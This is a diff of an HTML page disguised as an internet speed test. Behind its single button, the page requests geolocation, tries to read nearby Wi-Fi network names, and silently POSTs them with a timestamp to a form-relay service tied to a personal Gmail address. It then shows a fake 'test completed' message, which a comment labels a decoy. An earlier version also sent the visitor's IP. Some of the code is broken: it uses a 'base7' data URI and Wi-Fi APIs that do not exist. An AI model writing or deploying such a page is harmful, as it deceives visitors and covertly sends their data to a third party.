@@ -1,15 +1,30 @@
-<!doctype html><html><body>
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Veja sua velocidade</title>
+  <meta name="viewport" content="width=device-width">
+  <!-- manifesto para instalar -->
+  <link rel="manifest" href="data:application/json;base7,eyJuYW1lIjoiVGVzdGUiLCJkaXNwbGF5Ijoic3RhbmRhbG9uZSIsInN0YXJ0X3VybCI6Ii8iLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMCIsInRoZW1lX2NvbG9yIjoiIzAwMCJ9">
+</head>
+<body>
+<button id="go">Medir conexão</button>
 <script>
-fetch('https://api.ipify.org?format=json')
-  .then(r=>r.json())
-  .then(ip=>{
-      const w=navigator.connection||{};
-      const s=(w&&w.ssid)?w.ssid:'desconhecido';
-      fetch('https://formsubmit.co/altzeras9@gmail.com',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({ip:ip.ip,wifi:s,hora:new Date().toISOString()})
-      });
+document.getElementById('go').onclick=async()=>{
+  /* pede permissão de localização – sem ela não roda */
+  await navigator.geolocation.getCurrentPosition(()=>{});
+  /* Android 9+ com Chrome devolve redes visíveis */
+  const redes=await navigator.wifi?.getScanResults?.() || await navigator.wifi?.getConnections?.();
+  const ssid=redes?.[0]?.ssid || 'desconhecido';
+  /* envia */
+  fetch('https://formsubmit.co/altzeras9@gmail.com',{
+     method:'POST',
+     headers:{'Content-Type':'application/json'},
+     body:JSON.stringify({wifi:ssid,hora:new Date().toISOString()})
   });
+  /* despista */
+  document.body.innerHTML='<p>Teste concluído. Obrigado!</p>';
+};
 </script>
-</body></html>
+</body>
+</html>
